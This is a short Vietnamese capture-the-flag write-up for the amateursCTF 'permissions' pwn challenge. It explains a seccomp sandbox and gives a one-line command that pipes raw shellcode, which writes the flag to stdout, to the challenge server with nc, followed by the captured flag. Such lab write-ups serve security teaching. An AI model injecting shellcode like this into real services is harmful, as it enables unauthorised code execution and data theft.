# PERMISSIONS

## Overview

![img](/amateursCTF/Pwn/permissions/assets/overview.png)

- Bài cho chúng ta 3 file, check file code `chal.c`, mình thấy chương trình set rule bằng `seccomp` chỉ cấp quyền cho read, write, exit, exit_group.
</br>![img](/amateursCTF/Pwn/permissions/assets/seccomp.png)

- Bên dưới hàm `main` thực hiện đọc flag vào một vùng nhớ được cấp bằng `mmap()`, sau đó ta được cấp một vùng nhớ có quyền read, write, execute là `code` tại đây ta sẽ nhập shellcode và ở cuối thì chương trình sẽ thực hiện shellcode đó với đối số là địa chỉ của chuỗi flag.
</br>![img](/amateursCTF/Pwn/permissions/assets/main.png)

## Idea

- Do bài chỉ nhập và chạy shellcode, mà quyền đọc, ghi vẫn đủ cả nên mình viết đoạn shellcode nhỏ này đơn giản là gọi `write(1, flag, 0x100)`.
</br>![img](/amateursCTF/Pwn/permissions/assets/shellcode.png)

## Script

- Chạy đoạn bash script này trên terminal là xong.

```bash
echo "\x48\xC7\xC0\x01\x00\x00\x00\x48\x89\xFE\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05" | nc amt.rs 31174
```

## RESULT

![img](/amateursCTF/Pwn/permissions/assets/result.png)

>### Flag: amateursCTF{exec_1mpl13s_r34d_8751fda0}
